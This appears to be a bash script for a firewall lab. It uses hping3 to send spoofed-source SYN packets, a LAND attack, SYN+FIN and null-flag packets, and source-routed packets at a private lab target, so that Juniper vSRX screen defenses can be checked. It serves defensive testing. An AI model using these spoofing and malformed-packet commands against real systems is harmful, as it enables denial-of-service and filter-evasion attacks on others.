#!/bin/bash
# Scenario 6: IP Spoofing + Malformed TCP Attacks
# Run this from Kali Linux (ssh kali@<kali-eip>)
#
# BEFORE applying defense:
#   Spoofed packets and malformed TCP reach the web server
#
# AFTER defense (Screen: ip spoofing, tcp land, tcp syn-fin, tcp no-flag):
#   SRX drops all anomalous packets at the untrust interface
#
# Verify on vSRX:
#   show security screen statistics interface ge-0/0/0
#   show log security-log | match "SPOOF\|LAND\|SYN-FIN" | last 20

TARGET="10.0.2.100"

echo "========================================"
echo "Scenario 6: IP Spoofing + Malformed TCP"
echo "Target: $TARGET"
echo "========================================"
echo ""

echo "[*] Attack 1 — IP spoofing (forge source as external/random IP)..."
echo "    Sending 5 TCP SYN packets with spoofed source 1.2.3.4 → port 80"
sudo hping3 -S -a 1.2.3.4 -p 80 -c 5 "$TARGET"
echo ""

echo "[*] Attack 2 — Land attack (source IP = destination IP)..."
echo "    Classic DoS: packet claims to come FROM the target itself"
sudo hping3 -S -a "$TARGET" -p 80 -c 5 --destport 80 "$TARGET"
echo ""

echo "[*] Attack 3 — SYN + FIN flags set simultaneously (invalid TCP)..."
echo "    Valid TCP never has both SYN and FIN set — fingerprinting/evasion technique"
sudo hping3 -S -F -p 80 -c 5 "$TARGET"
echo ""

echo "[*] Attack 4 — TCP packet with NO flags set (null scan)..."
sudo hping3 -p 80 -c 5 "$TARGET"
echo ""

echo "[*] Attack 5 — IP source routing option (often used to bypass filters)..."
sudo hping3 --lsrr -p 80 -c 5 "$TARGET"
echo ""

echo "[+] On vSRX, run:"
echo "    show security screen statistics interface ge-0/0/0"
echo "    show log security-log | last 30"
